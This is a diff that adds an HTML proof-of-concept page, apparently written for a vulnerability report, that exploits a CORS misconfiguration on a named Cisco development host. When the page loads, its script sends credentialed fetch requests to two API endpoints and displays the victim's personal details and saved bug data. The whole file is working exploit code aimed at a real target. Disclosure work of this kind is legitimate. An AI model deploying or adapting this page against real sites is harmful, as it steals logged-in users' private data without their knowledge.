@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <title>PII Leak CORS PoC</title>
+</head>
+<body>
+ <h1>PII and saved bug Leak CORS PoC</h1>
+ <pre id="output">Loading...</pre>
+ <script>
+
+ async function performCorsRequests() {
+ const outputElement = document.getElementById("output");
+
+ try {
+ const userDetailsResponse = await fetch("https://bst-dev.cisco.com/api/getUserDetails", {
+ method: "GET",
+ credentials: "include"
+ });
+ const userDetails = await userDetailsResponse.text();
+ outputElement.textContent = `First request:\nGET /api/getUserDetails HTTP/1.1\nHost: bst-dev.cisco.com\n\nPII: ${userDetails}\n\n`;
+
+ const savedBugsResponse = await fetch("https://bst-dev.cisco.com/api/mbwdata", {
+ method: "GET",
+ credentials: "include"
+ });
+ const savedBugs = await savedBugsResponse.text();
+ outputElement.textContent += `Second request:\nGET /api/mbwdata HTTP/1.1\nHost: bst-dev.cisco.com\n\nSAVED Bugs: ${savedBugs}\n\n`;
+
+ } catch (error) {
+ console.error("Error performing CORS requests:", error);
+ outputElement.textContent += "Error performing CORS requests. Check the console for details.\n\n";
+ }
+ }
+
+ // Trigger the attack on page load
+ window.onload = performCorsRequests;
+ </script>
+</body>
+</html>
